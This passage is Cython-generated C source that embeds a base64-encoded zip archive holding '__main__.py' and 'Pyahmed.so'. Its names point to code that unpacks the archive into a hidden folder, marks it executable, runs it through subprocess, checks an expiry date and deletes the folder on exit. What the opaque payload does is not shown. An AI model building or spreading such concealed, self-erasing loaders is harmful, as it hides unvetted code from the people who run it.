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";
static PyObject *__pyx_kp_u_2025_12_31_00_00_00_000;
static PyObject *__pyx_n_s_AH;
static PyObject *__pyx_n_s_BaseException;
static PyObject *__pyx_n_s_CalledProcessError;
static PyObject *__pyx_n_u_CanYou;
static PyObject *__pyx_n_s_Dev;
static PyObject *__pyx_n_s_Do_Not;
static PyObject *__pyx_n_u_Done;
static PyObject *__pyx_n_s_Mahos;
static PyObject *__pyx_n_s_MyHome;
static PyObject *__pyx_kp_u_O5_QO;
static PyObject *__pyx_kp_u_Pyahmed_so;
static PyObject *__pyx_n_s_Pyprivate;
static PyObject *__pyx_kp_u_UEsDBBQAAAAIAD2Amls7jcMKkwEAADYC;
static PyObject *__pyx_kp_u_Y_m_d_H_M_S_f;
static PyObject *__pyx_n_s_ZipFile;
static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_n_s_atexit;
static PyObject *__pyx_n_s_b64decode;
static PyObject *__pyx_n_s_base64;
static PyObject *__pyx_n_s_check;
static PyObject *__pyx_n_s_chmod;
static PyObject *__pyx_n_s_cleanup;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_current_time;
static PyObject *__pyx_n_s_cwd;
static PyObject *__pyx_n_s_datetime;
static PyObject *__pyx_n_s_e;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_exists;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exit_2;
static PyObject *__pyx_n_s_expanduser;
static PyObject *__pyx_n_s_expiry_time;
static PyObject *__pyx_n_s_extractall;
static PyObject *__pyx_n_s_f;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_n_s_join;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_kp_u_main___py;
static PyObject *__pyx_n_s_makedirs;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_n_s_now;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_path;
static PyObject *__pyx_n_s_print;
static PyObject *__pyx_n_s_pyahmed_path;
static PyObject *__pyx_kp_u_pyprivate;
static PyObject *__pyx_n_u_python;
static PyObject *__pyx_n_u_r;
static PyObject *__pyx_n_s_register;
static PyObject *__pyx_n_s_rmtree;
static PyObject *__pyx_n_s_run;
static PyObject *__pyx_n_s_shutil;
static PyObject *__pyx_n_s_source;
static PyObject *__pyx_kp_s_source_py;
static PyObject *__pyx_n_s_strptime;
static PyObject *__pyx_n_s_subprocess;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_u_wb;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_n_s_zip_ref;
static PyObject *__pyx_n_s_zipfile;
static PyObject *__pyx_pf_6source_cleanup(CYTHON_UNUSED PyObject *__pyx_self); /* proto */
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_493;
static PyObject *__pyx_tuple_;
static PyObject *__pyx_tuple__2;
static PyObject *__pyx_tuple__3;
static PyObject *__pyx_tuple__4;
static PyObject *__pyx_tuple__6;
static PyObject *__pyx_tuple__8;
static PyObject *__pyx_codeobj__7;
/* Late includes */



/* Python wrapper */
static PyObject *__pyx_pw_6source_1cleanup(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_6source_1cleanup = {"cleanup", (PyCFunction)__pyx_pw_6source_1cleanup, METH_NOARGS, 0};
static PyObject *__pyx_pw_6source_1cleanup(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("cleanup (wrapper)", 0);
  __pyx_r = __pyx_pf_6source_cleanup(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_6source_cleanup(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  int __pyx_t_5;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  int __pyx_t_9;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("cleanup", 0);

  
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_path); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_exists); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __pyx_t_4 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_4)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_4);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
    }
  }
  __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_2, __pyx_t_4, __pyx_t_3) : __Pyx_PyObject_CallOneArg(__pyx_t_2, __pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_5 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_5 < 0)) __PYX_ERR(0, 27, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__pyx_t_5) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_7, &__pyx_t_8);
      __Pyx_XGOTREF(__pyx_t_6);
      __Pyx_XGOTREF(__pyx_t_7);
      __Pyx_XGOTREF(__pyx_t_8);
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_shutil); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_rmtree); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 29, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_Pyprivate); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 29, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_4 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
          }
        }
        __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_t_2) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_2);
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 29, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
        __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple_, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 30, __pyx_L4_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

        
      }
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      goto __pyx_L9_try_end;
      __pyx_L4_error:;
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;

      
      __pyx_t_9 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_BaseException);
      if (__pyx_t_9) {
        __Pyx_ErrRestore(0,0,0);
        goto __pyx_L5_exception_handled;
      }
      goto __pyx_L6_except_error;
      __pyx_L6_except_error:;

      
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      goto __pyx_L1_error;
      __pyx_L5_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_6);
      __Pyx_XGIVEREF(__pyx_t_7);
      __Pyx_XGIVEREF(__pyx_t_8);
      __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_7, __pyx_t_8);
      __pyx_L9_try_end:;
    }

    
  }

  

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_AddTraceback("source.cleanup", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_2025_12_31_00_00_00_000, __pyx_k_2025_12_31_00_00_00_000, sizeof(__pyx_k_2025_12_31_00_00_00_000), 0, 1, 0, 0},
  {&__pyx_n_s_AH, __pyx_k_AH, sizeof(__pyx_k_AH), 0, 0, 1, 1},
  {&__pyx_n_s_BaseException, __pyx_k_BaseException, sizeof(__pyx_k_BaseException), 0, 0, 1, 1},
  {&__pyx_n_s_CalledProcessError, __pyx_k_CalledProcessError, sizeof(__pyx_k_CalledProcessError), 0, 0, 1, 1},
  {&__pyx_n_u_CanYou, __pyx_k_CanYou, sizeof(__pyx_k_CanYou), 0, 1, 0, 1},
  {&__pyx_n_s_Dev, __pyx_k_Dev, sizeof(__pyx_k_Dev), 0, 0, 1, 1},
  {&__pyx_n_s_Do_Not, __pyx_k_Do_Not, sizeof(__pyx_k_Do_Not), 0, 0, 1, 1},
  {&__pyx_n_u_Done, __pyx_k_Done, sizeof(__pyx_k_Done), 0, 1, 0, 1},
  {&__pyx_n_s_Mahos, __pyx_k_Mahos, sizeof(__pyx_k_Mahos), 0, 0, 1, 1},
  {&__pyx_n_s_MyHome, __pyx_k_MyHome, sizeof(__pyx_k_MyHome), 0, 0, 1, 1},
  {&__pyx_kp_u_O5_QO, __pyx_k_O5_QO, sizeof(__pyx_k_O5_QO), 0, 1, 0, 0},
  {&__pyx_kp_u_Pyahmed_so, __pyx_k_Pyahmed_so, sizeof(__pyx_k_Pyahmed_so), 0, 1, 0, 0},
  {&__pyx_n_s_Pyprivate, __pyx_k_Pyprivate, sizeof(__pyx_k_Pyprivate), 0, 0, 1, 1},
  {&__pyx_kp_u_UEsDBBQAAAAIAD2Amls7jcMKkwEAADYC, __pyx_k_UEsDBBQAAAAIAD2Amls7jcMKkwEAADYC, sizeof(__pyx_k_UEsDBBQAAAAIAD2Amls7jcMKkwEAADYC), 0, 1, 0, 0},
  {&__pyx_kp_u_Y_m_d_H_M_S_f, __pyx_k_Y_m_d_H_M_S_f, sizeof(__pyx_k_Y_m_d_H_M_S_f), 0, 1, 0, 0},
  {&__pyx_n_s_ZipFile, __pyx_k_ZipFile, sizeof(__pyx_k_ZipFile), 0, 0, 1, 1},
  {&__pyx_kp_u__5, __pyx_k__5, sizeof(__pyx_k__5), 0, 1, 0, 0},
  {&__pyx_n_s_atexit, __pyx_k_atexit, sizeof(__pyx_k_atexit), 0, 0, 1, 1},
  {&__pyx_n_s_b64decode, __pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 0, 1, 1},
  {&__pyx_n_s_base64, __pyx_k_base64, sizeof(__pyx_k_base64), 0, 0, 1, 1},
  {&__pyx_n_s_check, __pyx_k_check, sizeof(__pyx_k_check), 0, 0, 1, 1},
  {&__pyx_n_s_chmod, __pyx_k_chmod, sizeof(__pyx_k_chmod), 0, 0, 1, 1},
  {&__pyx_n_s_cleanup, __pyx_k_cleanup, sizeof(__pyx_k_cleanup), 0, 0, 1, 1},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_current_time, __pyx_k_current_time, sizeof(__pyx_k_current_time), 0, 0, 1, 1},
  {&__pyx_n_s_cwd, __pyx_k_cwd, sizeof(__pyx_k_cwd), 0, 0, 1, 1},
  {&__pyx_n_s_datetime, __pyx_k_datetime, sizeof(__pyx_k_datetime), 0, 0, 1, 1},
  {&__pyx_n_s_e, __pyx_k_e, sizeof(__pyx_k_e), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_exists, __pyx_k_exists, sizeof(__pyx_k_exists), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_n_s_expanduser, __pyx_k_expanduser, sizeof(__pyx_k_expanduser), 0, 0, 1, 1},
  {&__pyx_n_s_expiry_time, __pyx_k_expiry_time, sizeof(__pyx_k_expiry_time), 0, 0, 1, 1},
  {&__pyx_n_s_extractall, __pyx_k_extractall, sizeof(__pyx_k_extractall), 0, 0, 1, 1},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_n_s_join, __pyx_k_join, sizeof(__pyx_k_join), 0, 0, 1, 1},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_kp_u_main___py, __pyx_k_main___py, sizeof(__pyx_k_main___py), 0, 1, 0, 0},
  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_n_s_now, __pyx_k_now, sizeof(__pyx_k_now), 0, 0, 1, 1},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
  {&__pyx_n_s_print, __pyx_k_print, sizeof(__pyx_k_print), 0, 0, 1, 1},
  {&__pyx_n_s_pyahmed_path, __pyx_k_pyahmed_path, sizeof(__pyx_k_pyahmed_path), 0, 0, 1, 1},
  {&__pyx_kp_u_pyprivate, __pyx_k_pyprivate, sizeof(__pyx_k_pyprivate), 0, 1, 0, 0},
  {&__pyx_n_u_python, __pyx_k_python, sizeof(__pyx_k_python), 0, 1, 0, 1},
  {&__pyx_n_u_r, __pyx_k_r, sizeof(__pyx_k_r), 0, 1, 0, 1},
  {&__pyx_n_s_register, __pyx_k_register, sizeof(__pyx_k_register), 0, 0, 1, 1},
  {&__pyx_n_s_rmtree, __pyx_k_rmtree, sizeof(__pyx_k_rmtree), 0, 0, 1, 1},
  {&__pyx_n_s_run, __pyx_k_run, sizeof(__pyx_k_run), 0, 0, 1, 1},
  {&__pyx_n_s_shutil, __pyx_k_shutil, sizeof(__pyx_k_shutil), 0, 0, 1, 1},
  {&__pyx_n_s_source, __pyx_k_source, sizeof(__pyx_k_source), 0, 0, 1, 1},
  {&__pyx_kp_s_source_py, __pyx_k_source_py, sizeof(__pyx_k_source_py), 0, 0, 1, 0},
  {&__pyx_n_s_strptime, __pyx_k_strptime, sizeof(__pyx_k_strptime), 0, 0, 1, 1},
  {&__pyx_n_s_subprocess, __pyx_k_subprocess, sizeof(__pyx_k_subprocess), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_u_wb, __pyx_k_wb, sizeof(__pyx_k_wb), 0, 1, 0, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_s_zip_ref, __pyx_k_zip_ref, sizeof(__pyx_k_zip_ref), 0, 0, 1, 1},
  {&__pyx_n_s_zipfile, __pyx_k_zipfile, sizeof(__pyx_k_zipfile), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 12, __pyx_L1_error)
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 13, __pyx_L1_error)
